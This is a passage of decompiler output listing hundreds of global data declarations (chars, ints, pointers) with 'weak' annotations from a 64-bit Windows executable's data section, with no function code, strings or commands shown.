char byte_1400D9AB8[]; // weak
char byte_1400D9AB9; // weak
char byte_1400D9ABA; // weak
char byte_1400D9ABB; // weak
char byte_1400D9ABC; // weak
int dword_1400D9AC0; // weak
char byte_1400D9AC8[]; // weak
char byte_1400D9AC9; // weak
char byte_1400D9ACA; // weak
char byte_1400D9ACB; // weak
char byte_1400D9ACC; // weak
char byte_1400D9ACD; // weak
char byte_1400D9ACE; // weak
char byte_1400D9ACF; // weak
char byte_1400D9AD0; // weak
char byte_1400D9AD1; // weak
char byte_1400D9AD2; // weak
char byte_1400D9AD3; // weak
char byte_1400D9AD4; // weak
char byte_1400D9AD5; // weak
char byte_1400D9AD6; // weak
char byte_1400D9AD7; // weak
char byte_1400D9AD8; // weak
char byte_1400D9AE0[18]; // idb
char byte_1400D9AF2; // weak
int dword_1400D9AF4; // weak
char byte_1400D9AF8[]; // weak
char byte_1400D9AF9; // weak
char byte_1400D9AFA; // weak
char byte_1400D9AFB; // weak
char byte_1400D9AFC; // weak
char byte_1400D9B00[12]; // idb
int dword_1400D9B0C; // weak
int dword_1400D9B10; // weak
int dword_1400D9B14; // weak
int dword_1400D9B18; // weak
char byte_1400D9B1C; // weak
int dword_1400D9B20; // weak
char byte_1400D9B28[]; // weak
char byte_1400D9B29; // weak
char byte_1400D9B2A; // weak
char byte_1400D9B2B; // weak
char byte_1400D9B2C; // weak
char byte_1400D9B2D; // weak
char byte_1400D9B2E; // weak
char byte_1400D9B2F; // weak
char byte_1400D9B30; // weak
char byte_1400D9B31; // weak
char byte_1400D9B32; // weak
char byte_1400D9B33; // weak
char byte_1400D9B34; // weak
char byte_1400D9B35; // weak
char byte_1400D9B36; // weak
char byte_1400D9B37; // weak
char byte_1400D9B38; // weak
char byte_1400D9B39; // weak
char byte_1400D9B3A; // weak
char byte_1400D9B3B; // weak
char byte_1400D9B3C; // weak
char byte_1400D9B3D; // weak
char byte_1400D9B3E; // weak
char byte_1400D9B3F; // weak
char byte_1400D9B40; // weak
char byte_1400D9B41; // weak
char byte_1400D9B42; // weak
char byte_1400D9B43; // weak
char byte_1400D9B44; // weak
char byte_1400D9B45; // weak
char byte_1400D9B46; // weak
char byte_1400D9B47; // weak
char byte_1400D9B48; // weak
char byte_1400D9B49; // weak
char byte_1400D9B4A; // weak
char byte_1400D9B4B; // weak
char byte_1400D9B4C; // weak
char byte_1400D9B4D; // weak
char byte_1400D9B4E; // weak
char byte_1400D9B4F; // weak
char byte_1400D9B50; // weak
char byte_1400D9B51; // weak
char byte_1400D9B52; // weak
char byte_1400D9B53; // weak
char byte_1400D9B54; // weak
char byte_1400D9B55; // weak
int dword_1400D9B58; // weak
char byte_1400D9B60[]; // weak
char byte_1400D9B61; // weak
char byte_1400D9B62; // weak
char byte_1400D9B63; // weak
char byte_1400D9B64; // weak
char byte_1400D9B65; // weak
char byte_1400D9B66; // weak
char byte_1400D9B67; // weak
char byte_1400D9B68; // weak
char byte_1400D9B69; // weak
char byte_1400D9B6A; // weak
char byte_1400D9B6B; // weak
char byte_1400D9B6C; // weak
char byte_1400D9B6D; // weak
char byte_1400D9B6E; // weak
char byte_1400D9B6F; // weak
int dword_1400D9B74; // weak
int dword_1400D9B78; // weak
int dword_1400D9B7C; // weak
int dword_1400D9B80; // weak
char byte_1400D9B84; // weak
int dword_1400D9B88; // weak
char byte_1400D9B90[]; // weak
char byte_1400D9B91; // weak
char byte_1400D9B92; // weak
char byte_1400D9B93; // weak
char byte_1400D9B94; // weak
char byte_1400D9B95; // weak
char byte_1400D9B96; // weak
char byte_1400D9B97; // weak
char byte_1400D9B98; // weak
char byte_1400D9B99; // weak
char byte_1400D9B9A; // weak
char byte_1400D9B9B; // weak
char byte_1400D9B9C; // weak
int dword_1400D9BA0; // weak
__int64 qword_1400D9BA8; // weak
_UNKNOWN unk_1400D9BB7; // weak
int dword_1400D9BB8; // weak
int dword_1400D9BBC; // weak
int dword_1400D9BC0; // weak
int dword_1400D9BC4; // weak
int dword_1400D9BCC; // weak
int dword_1400D9BD0; // weak
int dword_1400D9BD4; // weak
int dword_1400D9BD8; // weak
char byte_1400D9BDC; // weak
int dword_1400D9BE0; // weak
char byte_1400D9BE8[]; // weak
char byte_1400D9BE9; // weak
char byte_1400D9BEA; // weak
char byte_1400D9BEB; // weak
char byte_1400D9BEC; // weak
char byte_1400D9BED; // weak
char byte_1400D9BEE; // weak
char byte_1400D9BEF; // weak
int dword_1400D9BF4; // weak
int dword_1400D9BF8; // weak
int dword_1400D9BFC; // weak
int dword_1400D9C00; // weak
int dword_1400D9C0C; // weak
int dword_1400D9C10; // weak
int dword_1400D9C14; // weak
int dword_1400D9C24; // weak
_UNKNOWN unk_1400D9C28; // weak
__int64 qword_1400D9C30; // weak
_UNKNOWN unk_1400D9C38; // weak
__int64 qword_1400D9C40; // weak
char byte_1400D9C49; // weak
int dword_1400D9C4C; // weak
char byte_1400D9C50[]; // weak
char byte_1400D9C51; // weak
char byte_1400D9C52; // weak
char byte_1400D9C53; // weak
char byte_1400D9C54; // weak
char byte_1400D9C55; // weak
char byte_1400D9C56; // weak
char byte_1400D9C57; // weak
char byte_1400D9C58; // weak
int dword_1400D9C5C; // weak
char byte_1400D9C60[]; // weak
char byte_1400D9C61; // weak
char byte_1400D9C62; // weak
char byte_1400D9C63; // weak
__int64 qword_1400D9C70; // weak
__int64 qword_1400D9C88; // weak
int dword_1400D9C9C; // weak
int dword_1400D9CA0; // weak
int dword_1400D9CA4; // weak
int dword_1400D9CA8; // weak
char byte_1400D9CAC; // weak
int dword_1400D9CB0; // weak
char byte_1400D9CB8[]; // weak
char byte_1400D9CB9; // weak
char byte_1400D9CBA; // weak
char byte_1400D9CBB; // weak
char byte_1400D9CBC; // weak
char byte_1400D9CBD; // weak
char byte_1400D9CBE; // weak
char byte_1400D9CBF; // weak
char byte_1400D9CC0; // weak
char byte_1400D9CC1; // weak
char byte_1400D9CC2; // weak
char byte_1400D9CC3; // weak
char byte_1400D9CC4; // weak
int dword_1400D9CD0; // weak
int dword_1400D9CD4; // weak
int dword_1400D9CD8; // weak
int dword_1400D9CDC; // weak
char byte_1400D9CE0; // weak
int dword_1400D9CE4; // weak
char byte_1400D9CF0[]; // weak
char byte_1400D9CF1; // weak
char byte_1400D9CF2; // weak
char byte_1400D9CF3; // weak
char byte_1400D9CF4; // weak
char byte_1400D9CF5; // weak
char byte_1400D9CF6; // weak
char byte_1400D9CF7; // weak
char byte_1400D9CF8; // weak
char byte_1400D9CF9; // weak
char byte_1400D9CFA; // weak
char byte_1400D9CFB; // weak
char byte_1400D9CFC; // weak
char byte_1400D9CFD; // weak
char byte_1400D9CFE; // weak
char byte_1400D9CFF; // weak
char byte_1400D9D00; // weak
char byte_1400D9D01; // weak
char byte_1400D9D02; // weak
char byte_1400D9D03; // weak
char byte_1400D9D04; // weak
char byte_1400D9D05; // weak
char byte_1400D9D06; // weak
char byte_1400D9D07; // weak
char byte_1400D9D08; // weak
char byte_1400D9D09; // weak
char byte_1400D9D0A; // weak
char byte_1400D9D0B; // weak
char byte_1400D9D0C; // weak
char byte_1400D9D0D; // weak
char byte_1400D9D0E; // weak
char byte_1400D9D0F; // weak
char byte_1400D9D10; // weak
char byte_1400D9D11; // weak
char byte_1400D9D12; // weak
char byte_1400D9D13; // weak
char byte_1400D9D14; // weak
char byte_1400D9D15; // weak
char byte_1400D9D16; // weak
char byte_1400D9D17; // weak
char byte_1400D9D18; // weak
char byte_1400D9D19; // weak
char byte_1400D9D1A; // weak
char byte_1400D9D1B; // weak
char byte_1400D9D1C; // weak
char byte_1400D9D1D; // weak
char byte_1400D9D1E; // weak
char byte_1400D9D1F; // weak
char byte_1400D9D20; // weak
char byte_1400D9D21; // weak
char byte_1400D9D22; // weak
char byte_1400D9D23; // weak
char byte_1400D9D24; // weak
char byte_1400D9D25; // weak
char byte_1400D9D26; // weak
char byte_1400D9D27; // weak
char byte_1400D9D28; // weak
char byte_1400D9D29; // weak
char byte_1400D9D2A; // weak
char byte_1400D9D2B; // weak
char byte_1400D9D2C; // weak
char byte_1400D9D2D; // weak
char byte_1400D9D2E; // weak
char byte_1400D9D2F; // weak
char byte_1400D9D30; // weak
char byte_1400D9D31; // weak
char byte_1400D9D32; // weak
char byte_1400D9D33; // weak
char byte_1400D9D34; // weak
char byte_1400D9D35; // weak
char byte_1400D9D36; // weak
char byte_1400D9D37; // weak
char byte_1400D9D38; // weak
char byte_1400D9D39; // weak
char byte_1400D9D3A; // weak
char byte_1400D9D3B; // weak
char byte_1400D9D3C; // weak
char byte_1400D9D3D; // weak
char byte_1400D9D3E; // weak
char byte_1400D9D3F; // weak
char byte_1400D9D40; // weak
char byte_1400D9D41; // weak
char byte_1400D9D42; // weak
char byte_1400D9D43; // weak
char byte_1400D9D44; // weak
char byte_1400D9D45; // weak
char byte_1400D9D46; // weak
char byte_1400D9D47; // weak
char byte_1400D9D48; // weak
char byte_1400D9D49; // weak
char byte_1400D9D4A; // weak
char byte_1400D9D4B; // weak
char byte_1400D9D4C; // weak
char byte_1400D9D4D; // weak
char byte_1400D9D4E; // weak
char byte_1400D9D4F; // weak
char byte_1400D9D50; // weak
char byte_1400D9D51; // weak
char byte_1400D9D52; // weak
char byte_1400D9D53; // weak
char byte_1400D9D54; // weak
char byte_1400D9D55; // weak
char byte_1400D9D56; // weak
char byte_1400D9D57; // weak
char byte_1400D9D58; // weak
char byte_1400D9D59; // weak
char byte_1400D9D5A; // weak
char byte_1400D9D5B; // weak
char byte_1400D9D5C; // weak
char byte_1400D9D5D; // weak
char byte_1400D9D5E; // weak
char byte_1400D9D5F; // weak
int dword_1400D9D60; // weak
int dword_1400D9D64; // weak
int dword_1400D9D6C; // weak
int dword_1400D9D70; // weak
int dword_1400D9D74; // weak
int dword_1400D9D78; // weak
char byte_1400D9D7C; // weak
int dword_1400D9D80; // weak
char byte_1400D9D88[]; // weak
char byte_1400D9D89; // weak
char byte_1400D9D8A; // weak
char byte_1400D9D8B; // weak
char byte_1400D9D8C; // weak
char byte_1400D9D8D; // weak
char byte_1400D9D8E; // weak
char byte_1400D9D8F; // weak
char byte_1400D9D90; // weak
char byte_1400D9D91; // weak
char byte_1400D9D92; // weak
char byte_1400D9D93; // weak
char byte_1400D9D94; // weak
char byte_1400D9D95; // weak
char byte_1400D9D96; // weak
char byte_1400D9D97; // weak
char byte_1400D9D98; // weak
char byte_1400D9D99; // weak
char byte_1400D9D9A; // weak
char byte_1400D9D9B; // weak
char byte_1400D9D9C; // weak
char byte_1400D9D9D; // weak
char byte_1400D9D9E; // weak
char byte_1400D9D9F; // weak
char byte_1400D9DA0; // weak
char byte_1400D9DA1; // weak
char byte_1400D9DA2; // weak
char byte_1400D9DA3; // weak
char byte_1400D9DA4; // weak
char byte_1400D9DA5; // weak
char byte_1400D9DA6; // weak
char byte_1400D9DA7; // weak
char byte_1400D9DA8; // weak
char byte_1400D9DA9; // weak
char byte_1400D9DAA; // weak
char byte_1400D9DAB; // weak
char byte_1400D9DAC; // weak
char byte_1400D9DAD; // weak
char byte_1400D9DAE; // weak
char byte_1400D9DAF; // weak
char byte_1400D9DB0; // weak
char byte_1400D9DB1; // weak
char byte_1400D9DB2; // weak
char byte_1400D9DB3; // weak
char byte_1400D9DB4; // weak
char byte_1400D9DB5; // weak
char byte_1400D9DB6; // weak
char byte_1400D9DB7; // weak
char byte_1400D9DB8; // weak
char byte_1400D9DB9; // weak
char byte_1400D9DBA; // weak
int dword_1400D9DC0; // weak
int dword_1400D9DC4; // weak
int dword_1400D9DC8; // weak
int dword_1400D9DCC; // weak
char byte_1400D9DD0; // weak
int dword_1400D9DD4; // weak
char byte_1400D9DD8[]; // weak
char byte_1400D9DD9; // weak
char byte_1400D9DDA; // weak
char byte_1400D9DDB; // weak
char byte_1400D9DDC; // weak
char byte_1400D9DDD; // weak
char byte_1400D9DDE; // weak
char byte_1400D9DDF; // weak
char byte_1400D9DE0; // weak
char byte_1400D9DE1; // weak
char byte_1400D9DE2; // weak
char byte_1400D9DE3; // weak
char byte_1400D9DE4; // weak
char byte_1400D9DE5; // weak
char byte_1400D9DE6; // weak
char byte_1400D9DE7; // weak
char byte_1400D9DE8; // weak
char byte_1400D9DE9; // weak
char byte_1400D9DEA; // weak
char byte_1400D9DEB; // weak
char byte_1400D9DEC; // weak
char byte_1400D9DED; // weak
char byte_1400D9DEE; // weak
char byte_1400D9DEF; // weak
char byte_1400D9DF0; // weak
char byte_1400D9DF1; // weak
char byte_1400D9DF2; // weak
char byte_1400D9DF3; // weak
char byte_1400D9DF4; // weak
char byte_1400D9DF5; // weak
char byte_1400D9DF6; // weak
char byte_1400D9DF7; // weak
char byte_1400D9DF8; // weak
char byte_1400D9DF9; // weak
char byte_1400D9DFA; // weak
char byte_1400D9DFB; // weak
char byte_1400D9DFC; // weak
char byte_1400D9DFD; // weak
char byte_1400D9DFE; // weak
char byte_1400D9DFF; // weak
char byte_1400D9E00; // weak
char byte_1400D9E01; // weak
char byte_1400D9E02; // weak
char byte_1400D9E03; // weak
char byte_1400D9E04; // weak
char byte_1400D9E05; // weak
char byte_1400D9E06; // weak
char byte_1400D9E07; // weak
char byte_1400D9E08; // weak
char byte_1400D9E09; // weak
char byte_1400D9E0A; // weak
char byte_1400D9E0B; // weak
char byte_1400D9E0C; // weak
char byte_1400D9E0D; // weak
char byte_1400D9E0E; // weak
int dword_1400D9E10; // weak
char byte_1400D9E18[]; // weak
char byte_1400D9E19; // weak
char byte_1400D9E1A; // weak
char byte_1400D9E1B; // weak
char byte_1400D9E1C; // weak
char byte_1400D9E1D; // weak
char byte_1400D9E1E; // weak
char byte_1400D9E1F; // weak
char byte_1400D9E20; // weak
char byte_1400D9E21; // weak
char byte_1400D9E22; // weak
char byte_1400D9E23; // weak
char byte_1400D9E24; // weak
char byte_1400D9E25; // weak
char byte_1400D9E26; // weak
char byte_1400D9E27; // weak
char byte_1400D9E28; // weak
int dword_1400D9E2C; // weak
void *qword_1400D9E30; // idb
int dword_1400D9E40; // weak
_UNKNOWN unk_1400D9E44; // weak
char byte_1400D9E46; // weak
int dword_1400D9E48; // weak
int dword_1400D9E4C; // weak
__int64 qword_1400D9E50; // weak
char byte_1400D9E58; // weak
int dword_1400D9E5C; // weak
char byte_1400D9E60[]; // weak
char byte_1400D9E61; // weak
char byte_1400D9E62; // weak
char byte_1400D9E63; // weak
char byte_1400D9E64; // weak
char byte_1400D9E65; // weak
char byte_1400D9E66; // weak
char byte_1400D9E67; // weak
char byte_1400D9E68; // weak
char byte_1400D9E69; // weak
char byte_1400D9E6A; // weak
char byte_1400D9E6B; // weak
int dword_1400D9E6C; // weak
char byte_1400D9E70[]; // weak
char byte_1400D9E71; // weak
char byte_1400D9E72; // weak
char byte_1400D9E73; // weak
char byte_1400D9E74[5]; // idb
char byte_1400D9E79; // weak
int dword_1400D9E7C; // weak
char byte_1400D9E80[]; // weak
char byte_1400D9E81; // weak
char byte_1400D9E82; // weak
char byte_1400D9E83; // weak
char byte_1400D9E84; // weak
char byte_1400D9E85; // weak
char byte_1400D9E86; // weak
char byte_1400D9E87; // weak
char byte_1400D9E88; // weak
int dword_1400D9E8C; // weak
char byte_1400D9E90[]; // weak
char byte_1400D9E91; // weak
char byte_1400D9E92; // weak
char byte_1400D9E93; // weak
char byte_1400D9E94; // weak
char byte_1400D9E95; // weak
char byte_1400D9E96; // weak
char byte_1400D9E97; // weak
char byte_1400D9E98; // weak
char byte_1400D9E99; // weak
char byte_1400D9E9A; // weak
char byte_1400D9E9B; // weak
char byte_1400D9E9C; // weak
char byte_1400D9E9D; // weak
char byte_1400D9E9E; // weak
int dword_1400D9EA0; // weak
char byte_1400D9EA8[]; // weak
char byte_1400D9EA9; // weak
char byte_1400D9EAA; // weak
char byte_1400D9EAB; // weak
char byte_1400D9EAC; // weak
char byte_1400D9EAD; // weak
char byte_1400D9EAE; // weak
char byte_1400D9EAF; // weak
char byte_1400D9EB0; // weak
char byte_1400D9EB1; // weak
char byte_1400D9EB2; // weak
char byte_1400D9EB3; // weak
char byte_1400D9EB4; // weak
char byte_1400D9EB5; // weak
char byte_1400D9EB6; // weak
char byte_1400D9EB7; // weak
char byte_1400D9EB8; // weak
char byte_1400D9EB9; // weak
char byte_1400D9EBA; // weak
char byte_1400D9EBB; // weak
char byte_1400D9EBC; // weak
char byte_1400D9EBD; // weak
char byte_1400D9EBE; // weak
char byte_1400D9EBF; // weak
char byte_1400D9EC0; // weak
int dword_1400D9EC4; // weak
char byte_1400D9EC8[]; // weak
char byte_1400D9EC9; // weak
char byte_1400D9ECA; // weak
char byte_1400D9ECB; // weak
char byte_1400D9ECC; // weak
char byte_1400D9ECD; // weak
char byte_1400D9ECE; // weak
char byte_1400D9ECF; // weak
char byte_1400D9ED0; // weak
char byte_1400D9ED1; // weak
char byte_1400D9ED2; // weak
char byte_1400D9ED3; // weak
char byte_1400D9ED4; // weak
char byte_1400D9ED5; // weak
char byte_1400D9ED6; // weak
char byte_1400D9ED7; // weak
char byte_1400D9ED8; // weak
char byte_1400D9ED9; // weak
char byte_1400D9EDA; // weak
char byte_1400D9EDB; // weak
char byte_1400D9EDC; // weak
char byte_1400D9EDD; // weak
char byte_1400D9EDE; // weak
char byte_1400D9EDF; // weak
char byte_1400D9EE0; // weak
char byte_1400D9EE1; // weak
char byte_1400D9EE2; // weak
char byte_1400D9EE3; // weak
char byte_1400D9EE4; // weak
int dword_1400D9EEC; // weak
int dword_1400D9EF0; // weak
int dword_1400D9EF4; // weak
int dword_1400D9EF8; // weak
char byte_1400D9EFC; // weak
int dword_1400D9F00; // weak
char byte_1400D9F04[]; // weak
char byte_1400D9F05; // weak
char byte_1400D9F06; // weak
char byte_1400D9F07; // weak
_DWORD dword_1400D9F10[256]; // idb
char byte_1400DA310; // weak
_UNKNOWN unk_1400DA317; // weak
int dword_1400DA318; // weak
int dword_1400DA31C; // weak
int dword_1400DA320; // weak
int dword_1400DA324; // weak
int dword_1400DA330; // weak
int dword_1400DA334; // weak
int dword_1400DA338; // weak
int dword_1400DA33C; // weak
int dword_1400DA350; // weak
int dword_1400DA354; // weak
int dword_1400DA358; // weak
int dword_1400DA360; // weak
char byte_1400DA364; // weak
int dword_1400DA368; // weak
char byte_1400DA370[]; // weak
char byte_1400DA371; // weak
char byte_1400DA372; // weak
char byte_1400DA373; // weak
char byte_1400DA374; // weak
char byte_1400DA375; // weak
char byte_1400DA376; // weak
char byte_1400DA377; // weak
char byte_1400DA378; // weak
char byte_1400DA379; // weak
char byte_1400DA37A; // weak
char byte_1400DA37B; // weak
char byte_1400DA37C; // weak
char byte_1400DA37D; // weak
char byte_1400DA37E; // weak
char byte_1400DA37F; // weak
char byte_1400DA380; // weak
char byte_1400DA381; // weak
char byte_1400DA382; // weak
char byte_1400DA383; // weak
char byte_1400DA384; // weak
char byte_1400DA385; // weak
char byte_1400DA386; // weak
char byte_1400DA387; // weak
char byte_1400DA388; // weak
char byte_1400DA389; // weak
char byte_1400DA38A; // weak
char byte_1400DA38B; // weak
char byte_1400DA38C; // weak
char byte_1400DA38D; // weak
char byte_1400DA38E; // weak
char byte_1400DA38F; // weak
int dword_1400DA390; // weak
char byte_1400DA398[]; // weak
char byte_1400DA399; // weak
char byte_1400DA39A; // weak
char byte_1400DA39B; // weak
char byte_1400DA39C; // weak
char byte_1400DA39D; // weak
char byte_1400DA39E; // weak
char byte_1400DA39F; // weak
char byte_1400DA3A0; // weak
char byte_1400DA3A1; // weak
char byte_1400DA3A2; // weak
char byte_1400DA3A3; // weak
int dword_1400DA3A4; // weak
char byte_1400DA3A8[]; // weak
char byte_1400DA3A9; // weak
char byte_1400DA3AA; // weak
char byte_1400DA3AB; // weak
char byte_1400DA3AC; // weak
char byte_1400DA3AD; // weak
char byte_1400DA3AE; // weak
char byte_1400DA3AF; // weak
char byte_1400DA3B0; // weak
char byte_1400DA3B1; // weak
char byte_1400DA3B2; // weak
char byte_1400DA3B3; // weak
char byte_1400DA3B4; // weak
char byte_1400DA3B5; // weak
char byte_1400DA3B6; // weak
char byte_1400DA3B7; // weak
char byte_1400DA3B8; // weak
char byte_1400DA3B9; // weak
char byte_1400DA3BA; // weak
char byte_1400DA3BB; // weak
char byte_1400DA3BC; // weak
char byte_1400DA3BD; // weak
char byte_1400DA3BE; // weak
char byte_1400DA3BF; // weak
char byte_1400DA3C0; // weak
char byte_1400DA3C1; // weak
char byte_1400DA3C2; // weak
char byte_1400DA3C3; // weak
char byte_1400DA3C4; // weak
char byte_1400DA3C5; // weak
char byte_1400DA3C6; // weak
char byte_1400DA3C7; // weak
char byte_1400DA3C8; // weak
char byte_1400DA3C9; // weak
char byte_1400DA3CA; // weak
char byte_1400DA3CB; // weak
int dword_1400DA3CC; // weak
char byte_1400DA3D0[]; // weak
char byte_1400DA3D1; // weak
char byte_1400DA3D2; // weak
char byte_1400DA3D3; // weak
char byte_1400DA3D4; // weak
char byte_1400DA3D5; // weak
char byte_1400DA3D6; // weak
char byte_1400DA3D7; // weak
char byte_1400DA3D8; // weak
char byte_1400DA3D9; // weak
int dword_1400DA3DC; // weak
char byte_1400DA3E0[]; // weak
char byte_1400DA3E1; // weak
char byte_1400DA3E2; // weak
char byte_1400DA3E3; // weak
char byte_1400DA3E4; // weak
char byte_1400DA3E5; // weak
char byte_1400DA3E6; // weak
char byte_1400DA3E7; // weak
char byte_1400DA3E8; // weak
void *qword_1400DA3F0; // idb
int dword_1400DA400; // weak
int dword_1400DA404; // weak
int dword_1400DA408; // weak
int dword_1400DA40C; // weak
void *qword_1400DA418; // idb
int dword_1400DA424; // weak
int dword_1400DA428; // weak
int dword_1400DA42C; // weak
int dword_1400DA434; // weak
char byte_1400DA438; // weak
int dword_1400DA43C; // weak
char byte_1400DA440[]; // weak
char byte_1400DA441; // weak
char byte_1400DA442; // weak
char byte_1400DA443; // weak
char byte_1400DA444; // weak
char byte_1400DA445; // weak
char byte_1400DA446; // weak
char byte_1400DA447; // weak
char byte_1400DA448; // weak
char byte_1400DA449; // weak
char byte_1400DA44A; // weak
char byte_1400DA44B; // weak
char byte_1400DA44C; // weak
char byte_1400DA44D; // weak
int dword_1400DA450; // weak
char byte_1400DA454[]; // weak
char byte_1400DA455; // weak
char byte_1400DA456; // weak
char byte_1400DA457; // weak
char byte_1400DA458[5]; // idb
char byte_1400DA45D; // weak
int dword_1400DA460; // weak
char byte_1400DA468[]; // weak
char byte_1400DA469; // weak
char byte_1400DA46A; // weak
char byte_1400DA46B; // weak
char byte_1400DA46C; // weak
char byte_1400DA46D; // weak
char byte_1400DA46E; // weak
char byte_1400DA46F; // weak
char byte_1400DA470; // weak
char byte_1400DA471; // weak
char byte_1400DA472; // weak
char byte_1400DA473; // weak
char byte_1400DA474; // weak
char byte_1400DA475; // weak
char byte_1400DA476; // weak
char byte_1400DA477; // weak
char byte_1400DA478; // weak
int dword_1400DA484; // weak
int dword_1400DA488; // weak
int dword_1400DA48C; // weak
int dword_1400DA49C; // weak
char byte_1400DA4A0; // weak
int dword_1400DA4A4; // weak
char byte_1400DA4A8[]; // weak
char byte_1400DA4A9; // weak
char byte_1400DA4AA; // weak
char byte_1400DA4AB; // weak
char byte_1400DA4AC; // weak
char byte_1400DA4AD; // weak
char byte_1400DA4AE; // weak
char byte_1400DA4B0[]; // weak
char byte_1400DA4B8; // weak
int dword_1400DA4BC; // weak
char byte_1400DA4C0[]; // weak
char byte_1400DA4C1; // weak
char byte_1400DA4C2; // weak
char byte_1400DA4C3; // weak
char byte_1400DA4C4; // weak
char byte_1400DA4C5; // weak
char byte_1400DA4C6; // weak
char byte_1400DA4C7; // weak
char byte_1400DA4C8[17]; // idb
char byte_1400DA4D9; // weak
int dword_1400DA4E0; // weak
int dword_1400DA4E4; // weak
int dword_1400DA4E8; // weak
int dword_1400DA4F0; // weak
char byte_1400DA4F4; // weak
int dword_1400DA4F8; // weak
char byte_1400DA500[]; // weak
char byte_1400DA501; // weak
char byte_1400DA502; // weak
char byte_1400DA503; // weak
char byte_1400DA504; // weak
char byte_1400DA505; // weak
char byte_1400DA506; // weak
char byte_1400DA507; // weak
char byte_1400DA508; // weak
char byte_1400DA509; // weak
char byte_1400DA50A; // weak
char byte_1400DA50B; // weak
int dword_1400DA50C; // weak
char byte_1400DA510[]; // weak
char byte_1400DA511; // weak
char byte_1400DA512; // weak
char byte_1400DA513; // weak
char byte_1400DA514; // weak
char byte_1400DA515; // weak
char byte_1400DA516; // weak
char byte_1400DA517; // weak
int dword_1400DA518; // weak
char byte_1400DA51C[]; // weak
char byte_1400DA51D; // weak
char byte_1400DA51E; // weak
char byte_1400DA51F; // weak
char byte_1400DA520; // weak
int dword_1400DA524; // weak
char byte_1400DA528[]; // weak
char byte_1400DA529; // weak
char byte_1400DA52A; // weak
char byte_1400DA52B; // weak
char byte_1400DA52C; // weak
char byte_1400DA52D; // weak
char byte_1400DA52E; // weak
char byte_1400DA52F; // weak
char byte_1400DA530; // weak
char byte_1400DA531; // weak
char byte_1400DA532; // weak
char byte_1400DA533; // weak
char byte_1400DA534; // weak
char byte_1400DA535; // weak
char byte_1400DA536; // weak
char byte_1400DA537; // weak
char byte_1400DA538; // weak
int dword_1400DA540; // weak
int dword_1400DA544; // weak
int dword_1400DA548; // weak
int dword_1400DA54C; // weak
char byte_1400DA550; // weak
int dword_1400DA554; // weak
char byte_1400DA558[]; // weak
char byte_1400DA559; // weak
char byte_1400DA55A; // weak
char byte_1400DA55B; // weak
char byte_1400DA55C; // weak
char byte_1400DA55D; // weak
char byte_1400DA55E; // weak
char byte_1400DA55F; // weak
char byte_1400DA560; // weak
char byte_1400DA561; // weak
char byte_1400DA562; // weak
char byte_1400DA563; // weak
char byte_1400DA564; // weak
char byte_1400DA565; // weak
char byte_1400DA566; // weak
char byte_1400DA567; // weak
char byte_1400DA568; // weak
char byte_1400DA569; // weak
char byte_1400DA56A; // weak
char byte_1400DA56B; // weak
char byte_1400DA56C; // weak
char byte_1400DA56D; // weak
char byte_1400DA56E; // weak
char byte_1400DA56F; // weak
char byte_1400DA570; // weak
char byte_1400DA571; // weak
char byte_1400DA572; // weak
char byte_1400DA573; // weak
char byte_1400DA574; // weak
char byte_1400DA575; // weak
char byte_1400DA576; // weak
char byte_1400DA577; // weak
char byte_1400DA578; // weak
char byte_1400DA579; // weak
char byte_1400DA57A; // weak
char byte_1400DA57B; // weak
char byte_1400DA57C; // weak
char byte_1400DA57D; // weak
char byte_1400DA57E; // weak
char byte_1400DA57F; // weak
char byte_1400DA580[48]; // idb
__int128 xmmword_1400DA5B0; // weak
int dword_1400DA5D0; // weak
int dword_1400DA5D4; // weak
int dword_1400DA5D8; // weak
int dword_1400DA5E0; // weak
char byte_1400DA5E4; // weak
int dword_1400DA5E8; // weak
char byte_1400DA5F0[]; // weak
char byte_1400DA5F1; // weak
char byte_1400DA5F2; // weak
char byte_1400DA5F3; // weak
char byte_1400DA5F4; // weak
char byte_1400DA5F5; // weak
char byte_1400DA5F6; // weak
char byte_1400DA5F7; // weak
char byte_1400DA5F8; // weak
char byte_1400DA5F9; // weak
char byte_1400DA5FA; // weak
char byte_1400DA5FB; // weak
char byte_1400DA5FC; // weak
char byte_1400DA5FD; // weak
int dword_1400DA600; // weak
char byte_1400DA608[]; // weak
char byte_1400DA609; // weak
char byte_1400DA60A; // weak
char byte_1400DA60B; // weak
char byte_1400DA60C; // weak
char byte_1400DA60D; // weak
char byte_1400DA60E; // weak
char byte_1400DA60F; // weak
char byte_1400DA610; // weak
char byte_1400DA611; // weak
char byte_1400DA612; // weak
char byte_1400DA613; // weak
char byte_1400DA614; // weak
char byte_1400DA615; // weak
char byte_1400DA616; // weak
char byte_1400DA617; // weak
char byte_1400DA618; // weak
char byte_1400DA619; // weak
char byte_1400DA61A; // weak
char byte_1400DA61B; // weak
char byte_1400DA61C; // weak
char byte_1400DA61D; // weak
char byte_1400DA61E; // weak
char byte_1400DA61F; // weak
char byte_1400DA620; // weak
char byte_1400DA621; // weak
char byte_1400DA622; // weak
char byte_1400DA623; // weak
char byte_1400DA624; // weak
char byte_1400DA625; // weak
char byte_1400DA626; // weak
char byte_1400DA627; // weak
char byte_1400DA628; // weak
char byte_1400DA629; // weak
char byte_1400DA62A; // weak
char byte_1400DA62B; // weak
char byte_1400DA62C; // weak
char byte_1400DA62D; // weak
char byte_1400DA62E; // weak
char byte_1400DA62F; // weak
__int64 qword_1400DA638; // weak
__int64 qword_1400DA648; // weak
__int64 qword_1400DA650; // weak
__int64 qword_1400DA658; // weak
void *qword_1400DA660; // idb
__int64 qword_1400DA670; // weak
__int64 qword_1400DA678; // weak
__int64 qword_1400DA688; // weak
int dword_1400DA690; // weak
__int64 qword_1400DA698; // weak
int dword_1400DA6A0; // weak
void *qword_1400DA6B0; // idb
__int64 qword_1400DA6C0; // weak
__int64 qword_1400DA6C8; // weak
void *qword_1400DA6D8; // idb
__int64 qword_1400DA6E8; // weak
__int64 qword_1400DA6F0; // weak
__int64 qword_1400DA700; // weak
__int64 qword_1400DA710; // weak
int dword_1400DA720; // weak
__int64 qword_1400DA728; // weak
__int64 qword_1400DA738; // weak
__int64 qword_1400DA750; // weak
__int64 qword_1400DA768; // weak
_UNKNOWN unk_1400DA780; // weak
__int64 qword_1400DA798; // weak
int dword_1400DA7A4; // weak
__int64 qword_1400DA7A8; // weak
__int64 qword_1400DA7B0; // weak
int dword_1400DA7B8; // weak
int dword_1400DA7BC; // weak
int dword_1400DA7C0; // weak
char byte_1400DA7C4; // weak
int dword_1400DA7C8; // weak
char byte_1400DA7D0[]; // weak
char byte_1400DA7D1; // weak
char byte_1400DA7D2; // weak
char byte_1400DA7D3; // weak
char byte_1400DA7D4; // weak
char byte_1400DA7D5; // weak
